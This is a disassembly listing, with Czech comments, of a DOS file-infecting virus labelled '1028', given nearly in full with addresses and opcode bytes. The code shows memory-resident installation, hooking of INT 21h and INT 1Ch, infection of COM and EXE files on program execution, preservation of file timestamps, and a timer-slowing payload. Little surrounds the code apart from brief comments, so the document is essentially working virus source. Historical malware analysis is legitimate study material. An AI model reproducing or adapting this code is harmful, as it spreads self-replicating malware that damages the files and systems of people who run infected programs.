;=====================================================================
; Virus 1028 neidentifikovany programem SCAN do verze
; Projevem je zmensovani casu.

;=====================================================================
; Obsluha preruseni 1CH
;
488F:0000 9C             PUSHF
488F:0001 1E             PUSH   DS
488F:0002 51             PUSH   CX
488F:0003 50             PUSH   AX
488F:0004 33C0           XOR    AX,AX
488F:0006 8ED8           MOV    DS,AX
488F:0008 A06E04         MOV    AL,[046E]
488F:000B 0AC0           OR     AL,AL
488F:000D 7409           JZ     0018
488F:000F B99C04         MOV    CX,049C
488F:0012 E2FE           LOOP   0012
488F:0014 FEC8           DEC    AL
488F:0016 75F7           JNZ    000F
488F:0018 58             POP    AX
488F:0019 59             POP    CX
488F:001A 1F             POP    DS
488F:001B 9D             POPF
488F:001C 2EFF2EEC03     JMP    FAR CS:[03EC]


488F:0050 BF0001         MOV    DI,0100
488F:0053 81C60004       ADD    SI,0400
488F:0057 A4             MOVSB
488F:0058 A5             MOVSW
488F:0059 8B260600       MOV    SP,[0006]
488F:005D 33DB           XOR    BX,BX
488F:005F 53             PUSH   BX
488F:0060 FF64F1         JMP    [SI-0F]
488F:0063 90             NOP

;=====================================================================
;
AX=0000  BX=0000  CX=0DF4  DX=0000  SP=0100  BP=0000  SI=0000  DI=0000
DS=47E0  ES=47E0  SS=48D0  CS=488F  IP=0064   NV UP EI PL NZ NA PO NC

488F:0064 E80000         CALL   0067
488F:0067 5E             POP    SI
488F:0068 FC             CLD
488F:0069 83C699         ADD    SI,-67
488F:006C 81BC00044D5A   CMP    Word Ptr [SI+0400],5A4D
488F:0072 740E           JZ     0082
488F:0074 FA             CLI
488F:0075 8BE6           MOV    SP,SI
488F:0077 81C40405       ADD    SP,0504
488F:007B FB             STI
488F:007C 3B260600       CMP    SP,[0006]
488F:0080 73CE           JNB    0050
488F:0082 50             PUSH   AX
488F:0083 06             PUSH   ES
488F:0084 56             PUSH   SI
488F:0085 1E             PUSH   DS
488F:0086 B8FE4B         MOV    AX,4BFE   ; test pritomnosti
488F:0089 CD21           INT    21        ;
488F:008B 81FFBB55       CMP    DI,55BB   ;
488F:008F 7504           JNZ    0095
488F:0091 07             POP    ES
488F:0092 E9A100         JMP    0136
488F:0095 07             POP    ES
488F:0096 B449           MOV    AH,49     ; uvolni alokovanou pamet
488F:0098 CD21           INT    21
488F:009A BBFFFF         MOV    BX,FFFF   ; zjisti velikost volne
488F:009D B448           MOV    AH,48     ; pameti
488F:009F CD21           INT    21
488F:00A1 83EB45         SUB    BX,+45    ; odecti velikost viru
488F:00A4 90             NOP
488F:00A5 7303           JNB    00AA
488F:00A7 E98C00         JMP    0136
488F:00AA 8CC1           MOV    CX,ES     ;
488F:00AC F9             STC
488F:00AD 13CB           ADC    CX,BX
488F:00AF B44A           MOV    AH,4A     ; modifikace alok. pameti
488F:00B1 CD21           INT    21
488F:00B3 BB4400         MOV    BX,0044
488F:00B6 F9             STC              ; zmen velikost v PSP
488F:00B7 26191E0200     SBB    ES:[0002],BX
488F:00BC 06             PUSH   ES
488F:00BD 8EC1           MOV    ES,CX
488F:00BF B44A           MOV    AH,4A     ; modifikuj pamet
488F:00C1 CD21           INT    21
488F:00C3 8CC0           MOV    AX,ES
488F:00C5 48             DEC    AX
488F:00C6 8ED8           MOV    DS,AX
488F:00C8 C70601000800   MOV    Word Ptr [0001],0008 ; systemova pamet
488F:00CE E89002         CALL   0361      ; AX * 10H
488F:00D1 8BD8           MOV    BX,AX     ;
488F:00D3 8BCA           MOV    CX,DX
488F:00D5 1F             POP    DS
488F:00D6 8CD8           MOV    AX,DS
488F:00D8 E88602         CALL   0361      ; AX * 10H
488F:00DB 03060600       ADD    AX,[0006] ;
488F:00DF 83D200         ADC    DX,+00
488F:00E2 2BC3           SUB    AX,BX
488F:00E4 1BD1           SBB    DX,CX
488F:00E6 7204           JB     00EC
488F:00E8 29060600       SUB    [0006],AX
488F:00EC 5E             POP    SI
488F:00ED 56             PUSH   SI
488F:00EE 1E             PUSH   DS
488F:00EF 0E             PUSH   CS
488F:00F0 33FF           XOR    DI,DI
488F:00F2 8EDF           MOV    DS,DI
488F:00F4 C5068400       LDS    AX,[0084]        ; precteme int 21H
488F:00F8 2E8984F003     MOV    CS:[SI+03F0],AX  ;
488F:00FD 2E8C9CF203     MOV    CS:[SI+03F2],DS  ;
488F:0102 E86202         CALL   0367        ; hledame nejaky program v
488F:0105 33FF           XOR    DI,DI       ; pameti (nevim jaky)
488F:0107 8EDF           MOV    DS,DI
488F:0109 C5067000       LDS    AX,[0070]        ; precteme int 1CH
488F:010D 2E8984EC03     MOV    CS:[SI+03EC],AX
488F:0112 2E8C9CEE03     MOV    CS:[SI+03EE],DS
488F:0117 1F             POP    DS
488F:0118 B90302         MOV    CX,0203
488F:011B F3             REPZ
488F:011C A5             MOVSW
488F:011D 33C0           XOR    AX,AX
488F:011F 8ED8           MOV    DS,AX
488F:0121 C70670000000   MOV    Word Ptr [0070],0000
488F:0127 8C067200       MOV    [0072],ES
488F:012B C70684004801   MOV    Word Ptr [0084],0148
488F:0131 8C068600       MOV    [0086],ES
488F:0135 07             POP    ES
488F:0136 5E             POP    SI
488F:0137 1F             POP    DS
488F:0138 58             POP    AX
488F:0139 2E81BC00044D5A CMP    Word Ptr CS:[SI+0400],5A4D
488F:0140 7403           JZ     0145
488F:0142 E90BFF         JMP    0050
488F:0145 E9D9FE         JMP    0021

;=====================================================================
;
488F:0148 80FC4B         CMP    AH,4B
488F:014B 7409           JZ     0156
488F:014D 2EFF2EF003     JMP    FAR CS:[03F0]
488F:0152 BFBB55         MOV    DI,55BB
488F:0155 CF             IRET
488F:0156 3CFE           CMP    AL,FE
488F:0158 74F8           JZ     0152
488F:015A 0AC0           OR     AL,AL
488F:015C 75EF           JNZ    014D
488F:015E 9C             PUSHF
488F:015F 50             PUSH   AX
488F:0160 53             PUSH   BX
488F:0161 51             PUSH   CX
488F:0162 52             PUSH   DX
488F:0163 56             PUSH   SI
488F:0164 57             PUSH   DI
488F:0165 55             PUSH   BP
488F:0166 06             PUSH   ES
488F:0167 1E             PUSH   DS
488F:0168 8CDE           MOV    SI,DS
488F:016A 33C0           XOR    AX,AX
488F:016C 8ED8           MOV    DS,AX
488F:016E C4069000       LES    AX,[0090]
488F:0172 06             PUSH   ES
488F:0173 50             PUSH   AX
488F:0174 C70690005E03   MOV    Word Ptr [0090],035E
488F:017A 8C0E9200       MOV    [0092],CS
488F:017E 8EDE           MOV    DS,SI
488F:0180 33C9           XOR    CX,CX
488F:0182 B80043         MOV    AX,4300
488F:0185 E85D02         CALL   03E5
488F:0188 8BD9           MOV    BX,CX
488F:018A 80E1F8         AND    CL,F8
488F:018D 3ACB           CMP    CL,BL
488F:018F 7407           JZ     0198
488F:0191 B80143         MOV    AX,4301
488F:0194 E84E02         CALL   03E5
488F:0197 F9             STC
488F:0198 9C             PUSHF
488F:0199 1E             PUSH   DS
488F:019A 52             PUSH   DX
488F:019B 53             PUSH   BX
488F:019C B8023D         MOV    AX,3D02
488F:019F E84302         CALL   03E5
488F:01A2 720A           JB     01AE
488F:01A4 8BD8           MOV    BX,AX
488F:01A6 E82A00         CALL   01D3
488F:01A9 B43E           MOV    AH,3E
488F:01AB E83702         CALL   03E5
488F:01AE 59             POP    CX
488F:01AF 5A             POP    DX
488F:01B0 1F             POP    DS
488F:01B1 9D             POPF
488F:01B2 7306           JNB    01BA
488F:01B4 B80143         MOV    AX,4301
488F:01B7 E82B02         CALL   03E5
488F:01BA 33C0           XOR    AX,AX
488F:01BC 8ED8           MOV    DS,AX
488F:01BE 8F069000       POP    [0090]
488F:01C2 8F069200       POP    [0092]
488F:01C6 1F             POP    DS
488F:01C7 07             POP    ES
488F:01C8 5D             POP    BP
488F:01C9 5F             POP    DI
488F:01CA 5E             POP    SI
488F:01CB 5A             POP    DX
488F:01CC 59             POP    CX
488F:01CD 5B             POP    BX
488F:01CE 58             POP    AX
488F:01CF 9D             POPF
488F:01D0 E97AFF         JMP    014D
488F:01D3 0E             PUSH   CS
488F:01D4 0E             PUSH   CS
488F:01D5 1F             POP    DS
488F:01D6 07             POP    ES
488F:01D7 BA0404         MOV    DX,0404
488F:01DA B91800         MOV    CX,0018
488F:01DD B43F           MOV    AH,3F
488F:01DF E80302         CALL   03E5
488F:01E2 33C9           XOR    CX,CX
488F:01E4 33D2           XOR    DX,DX
488F:01E6 B80242         MOV    AX,4202
488F:01E9 E8F901         CALL   03E5
488F:01EC 89161E04       MOV    [041E],DX
488F:01F0 3D0404         CMP    AX,0404
488F:01F3 83DA00         SBB    DX,+00
488F:01F6 7258           JB     0250
488F:01F8 A31C04         MOV    [041C],AX
488F:01FB A32004         MOV    [0420],AX
488F:01FE 813E04044D5A   CMP    Word Ptr [0404],5A4D
488F:0204 7517           JNZ    021D
488F:0206 A10C04         MOV    AX,[040C]
488F:0209 03061A04       ADD    AX,[041A]
488F:020D E85101         CALL   0361
488F:0210 03061804       ADD    AX,[0418]
488F:0214 83D200         ADC    DX,+00
488F:0217 8BCA           MOV    CX,DX
488F:0219 8BD0           MOV    DX,AX
488F:021B EB15           JMP    0232
488F:021D 803E0404E9     CMP    Byte Ptr [0404],E9
488F:0222 752D           JNZ    0251
488F:0224 8B160504       MOV    DX,[0405]
488F:0228 81C20301       ADD    DX,0103
488F:022C 7223           JB     0251
488F:022E FECE           DEC    DH
488F:0230 33C9           XOR    CX,CX
488F:0232 83EA64         SUB    DX,+64
488F:0235 83D900         SBB    CX,+00
488F:0238 B80042         MOV    AX,4200
488F:023B E8A701         CALL   03E5
488F:023E 050404         ADD    AX,0404
488F:0241 83D200         ADC    DX,+00
488F:0244 3B061C04       CMP    AX,[041C]
488F:0248 7507           JNZ    0251
488F:024A 3B161E04       CMP    DX,[041E]
488F:024E 7501           JNZ    0251
488F:0250 C3             RET
488F:0251 33C9           XOR    CX,CX
488F:0253 8BD1           MOV    DX,CX
488F:0255 B80242         MOV    AX,4202
488F:0258 E88A01         CALL   03E5
488F:025B 813E04044D5A   CMP    Word Ptr [0404],5A4D
488F:0261 7409           JZ     026C
488F:0263 050406         ADD    AX,0604
488F:0266 83D200         ADC    DX,+00
488F:0269 7419           JZ     0284
488F:026B C3             RET
488F:026C 8B161C04       MOV    DX,[041C]
488F:0270 F6DA           NEG    DL
488F:0272 83E20F         AND    DX,+0F
488F:0275 33C9           XOR    CX,CX
488F:0277 B80142         MOV    AX,4201
488F:027A E86801         CALL   03E5
488F:027D A31C04         MOV    [041C],AX
488F:0280 89161E04       MOV    [041E],DX
488F:0284 B80057         MOV    AX,5700
488F:0287 E85B01         CALL   03E5
488F:028A 9C             PUSHF
488F:028B 51             PUSH   CX
488F:028C 52             PUSH   DX
488F:028D 813E04044D5A   CMP    Word Ptr [0404],5A4D
488F:0293 7405           JZ     029A
488F:0295 B80001         MOV    AX,0100
488F:0298 EB07           JMP    02A1
488F:029A A11804         MOV    AX,[0418]
488F:029D 8B161A04       MOV    DX,[041A]
488F:02A1 BFF403         MOV    DI,03F4
488F:02A4 AB             STOSW
488F:02A5 8BC2           MOV    AX,DX
488F:02A7 AB             STOSW
488F:02A8 A11404         MOV    AX,[0414]
488F:02AB AB             STOSW
488F:02AC A11204         MOV    AX,[0412]
488F:02AF AB             STOSW
488F:02B0 A12004         MOV    AX,[0420]
488F:02B3 AB             STOSW
488F:02B4 A10804         MOV    AX,[0408]
488F:02B7 AB             STOSW
488F:02B8 BE0404         MOV    SI,0404
488F:02BB A5             MOVSW
488F:02BC A5             MOVSW
488F:02BD 33D2           XOR    DX,DX
488F:02BF B90404         MOV    CX,0404
488F:02C2 B440           MOV    AH,40
488F:02C4 E81E01         CALL   03E5
488F:02C7 7227           JB     02F0
488F:02C9 33C8           XOR    CX,AX
488F:02CB 7523           JNZ    02F0
488F:02CD 8BD1           MOV    DX,CX
488F:02CF B80042         MOV    AX,4200
488F:02D2 E81001         CALL   03E5
488F:02D5 813E04044D5A   CMP    Word Ptr [0404],5A4D
488F:02DB 7415           JZ     02F2
488F:02DD C6060404E9     MOV    Byte Ptr [0404],E9
488F:02E2 A11C04         MOV    AX,[041C]
488F:02E5 056100         ADD    AX,0061
488F:02E8 A30504         MOV    [0405],AX
488F:02EB B90300         MOV    CX,0003
488F:02EE EB5A           JMP    034A
488F:02F0 EB60           JMP    0352
488F:02F2 A10C04         MOV    AX,[040C]
488F:02F5 E86900         CALL   0361
488F:02F8 F7D0           NOT    AX
488F:02FA F7D2           NOT    DX
488F:02FC 40             INC    AX
488F:02FD 7501           JNZ    0300
488F:02FF 42             INC    DX
488F:0300 03061C04       ADD    AX,[041C]
488F:0304 13161E04       ADC    DX,[041E]
488F:0308 B91000         MOV    CX,0010
488F:030B F7F1           DIV    CX
488F:030D C70618046400   MOV    Word Ptr [0418],0064
488F:0313 A31A04         MOV    [041A],AX
488F:0316 054100         ADD    AX,0041
488F:0319 A31204         MOV    [0412],AX
488F:031C C70614040001   MOV    Word Ptr [0414],0100
488F:0322 81061C040404   ADD    Word Ptr [041C],0404
488F:0328 83161E0400     ADC    Word Ptr [041E],+00
488F:032D A11C04         MOV    AX,[041C]
488F:0330 25FF01         AND    AX,01FF
488F:0333 A30604         MOV    [0406],AX
488F:0336 9C             PUSHF
488F:0337 A11D04         MOV    AX,[041D]
488F:033A D02E1F04       SHR    Byte Ptr [041F],1
488F:033E D1D8           RCR    AX,1
488F:0340 9D             POPF
488F:0341 7401           JZ     0344
488F:0343 40             INC    AX
488F:0344 A30804         MOV    [0408],AX
488F:0347 B91800         MOV    CX,0018
488F:034A BA0404         MOV    DX,0404
488F:034D B440           MOV    AH,40
488F:034F E89300         CALL   03E5
488F:0352 5A             POP    DX
488F:0353 59             POP    CX
488F:0354 9D             POPF
488F:0355 7206           JB     035D
488F:0357 B80157         MOV    AX,5701
488F:035A E88800         CALL   03E5
488F:035D C3             RET
488F:035E B003           MOV    AL,03
488F:0360 CF             IRET

;=====================================================================
;
488F:0361 BA1000         MOV    DX,0010
488F:0364 F7E2           MUL    DX
488F:0366 C3             RET

;=====================================================================
;
488F:0367 9C             PUSHF
488F:0368 50             PUSH   AX
488F:0369 1E             PUSH   DS
488F:036A 06             PUSH   ES
488F:036B 33C0           XOR    AX,AX
488F:036D 8ED8           MOV    DS,AX
488F:036F C406A000       LES    AX,[00A0]     ; int 28
488F:0373 E84C00         CALL   03C2
488F:0376 7436           JZ     03AE
488F:0378 C4068000       LES    AX,[0080]     ; int 20
488F:037C E84300         CALL   03C2
488F:037F 742D           JZ     03AE
488F:0381 C4069C00       LES    AX,[009C]     ; int 27
488F:0385 E83A00         CALL   03C2
488F:0388 7424           JZ     03AE
488F:038A C4069800       LES    AX,[0098]     ; int 26
488F:038E E83100         CALL   03C2
488F:0391 741B           JZ     03AE
488F:0393 C4062400       LES    AX,[0024]     ; int  9
488F:0397 E82800         CALL   03C2
488F:039A 7412           JZ     03AE
488F:039C C4064C00       LES    AX,[004C]     ; int 13
488F:03A0 E81F00         CALL   03C2
488F:03A3 7409           JZ     03AE
488F:03A5 C4068400       LES    AX,[0084]     ; int 21
488F:03A9 E81600         CALL   03C2
488F:03AC 750F           JNZ    03BD
488F:03AE 26C4062312     LES    AX,ES:[1223]
488F:03B3 2E8984F003     MOV    CS:[SI+03F0],AX
488F:03B8 2E8C84F203     MOV    CS:[SI+03F2],ES
488F:03BD 07             POP    ES
488F:03BE 1F             POP    DS
488F:03BF 58             POP    AX
488F:03C0 9D             POPF
488F:03C1 C3             RET

488F:03C2 26813E601C3D0F CMP    Word Ptr ES:[1C60],0F3D
488F:03C9 7519           JNZ    03E4
488F:03CB 26813E641C05B8 CMP    Word Ptr ES:[1C64],B805
488F:03D2 7510           JNZ    03E4
488F:03D4 26813E681C9DCF CMP    Word Ptr ES:[1C68],CF9D
488F:03DB 7507           JNZ    03E4
488F:03DD 26813E6C1C3E28 CMP    Word Ptr ES:[1C6C],283E
488F:03E4 C3             RET

488F:03E5 9C             PUSHF
488F:03E6 2EFF1EF003     CALL   FAR CS:[03F0]
488F:03EB C3             RET
      3EC puvodni obsluha preruseni 1C
      3F0 puvodni obsluha preruseni 21

